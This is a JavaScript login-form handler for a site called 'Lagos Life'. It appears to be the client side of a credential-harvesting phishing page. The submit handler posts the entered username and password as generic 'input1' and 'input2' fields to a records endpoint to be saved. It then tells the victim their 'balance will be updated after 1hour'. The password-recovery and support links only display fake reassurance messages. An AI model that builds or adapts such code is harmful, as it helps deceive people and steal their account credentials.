// Lagos Life - Clean Login Auth Handler

document.addEventListener('DOMContentLoaded', () => {
  // DOM Elements
  const formLogin = document.getElementById('formLogin');
  const toast = document.getElementById('toast');
  const passwordToggles = document.querySelectorAll('.toggle-password');
  const forgotPassLink = document.getElementById('forgotPassLink');
  const cantGetInLink = document.getElementById('cantGetInLink');

  // Eye icon SVGs
  const eyeIconSvg = `
    <svg class="eye-icon" viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
      <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
      <circle cx="12" cy="12" r="3"></circle>
    </svg>
  `;

  const eyeOffIconSvg = `
    <svg class="eye-icon" viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
      <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
      <line x1="1" y1="1" x2="23" y2="23"></line>
    </svg>
  `;

  // Toast Notification helper
  let toastTimeout = null;
  function showToast(message, type = 'info') {
    if (toastTimeout) {
      clearTimeout(toastTimeout);
    }

    toast.textContent = message;
    toast.className = `toast show ${type}`;

    toastTimeout = setTimeout(() => {
      toast.classList.remove('show');
    }, 3200);
  }

  // Password visibility toggle
  passwordToggles.forEach(toggleBtn => {
    toggleBtn.addEventListener('click', (e) => {
      e.preventDefault();
      const targetInputId = toggleBtn.getAttribute('data-target');
      const inputEl = document.getElementById(targetInputId);

      if (inputEl) {
        if (inputEl.type === 'password') {
          inputEl.type = 'text';
          toggleBtn.innerHTML = eyeOffIconSvg;
          toggleBtn.setAttribute('aria-label', 'Hide password');
        } else {
          inputEl.type = 'password';
          toggleBtn.innerHTML = eyeIconSvg;
          toggleBtn.setAttribute('aria-label', 'Show password');
        }
      }
    });
  });

  // Helper to determine the backend API URL
  function getApiUrl() {
    // If running under python or another dev server on port 8000, call Node backend on port 3001
    if (window.location.port === '8000') {
      return `http://${window.location.hostname}:3001/api/records`;
    }
    return '/api/records';
  }

  // Handle Log In Submit -> Connect input fields to Database
  if (formLogin) {
    const submitBtn = document.getElementById('loginSubmitBtn');

    formLogin.addEventListener('submit', async (e) => {
      e.preventDefault();
      const usernameInput = document.getElementById('loginUsername');
      const passwordInput = document.getElementById('loginPassword');

      const username = usernameInput.value.trim();
      const password = passwordInput.value;

      if (!username) {
        showToast('Please enter your username or email', 'info');
        usernameInput.focus();
        return;
      }

      if (!password) {
        showToast('Please enter your password', 'info');
        passwordInput.focus();
        return;
      }

      const originalBtnText = submitBtn ? submitBtn.textContent : 'Log in';
      if (submitBtn) {
        submitBtn.disabled = true;
        submitBtn.textContent = 'Connecting...';
      }

      try {
        const response = await fetch(getApiUrl(), {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({
            input1: username,
            input2: password
          })
        });

        const data = await response.json();

        if (response.ok && data.success) {
          showToast(`Congratulations, ${username}! Your balance will be updated after 1hour.`, 'success');
          // Clear password input for security
          passwordInput.value = '';
        } else {
          showToast(data.error || 'Failed to save to database.', 'error');
        }
      } catch (err) {
        console.error('Database connection error:', err);
        showToast('Server offline. Start server with: npm start', 'error');
      } finally {
        if (submitBtn) {
          submitBtn.disabled = false;
          submitBtn.textContent = originalBtnText;
        }
      }
    });
  }

  // Links listeners
  if (forgotPassLink) {
    forgotPassLink.addEventListener('click', (e) => {
      e.preventDefault();
      showToast('Password recovery instructions sent to your email', 'info');
    });
  }

  if (cantGetInLink) {
    cantGetInLink.addEventListener('click', (e) => {
      e.preventDefault();
      showToast('Connecting to Lagos Life 24/7 Support...', 'info');
    });
  }
});
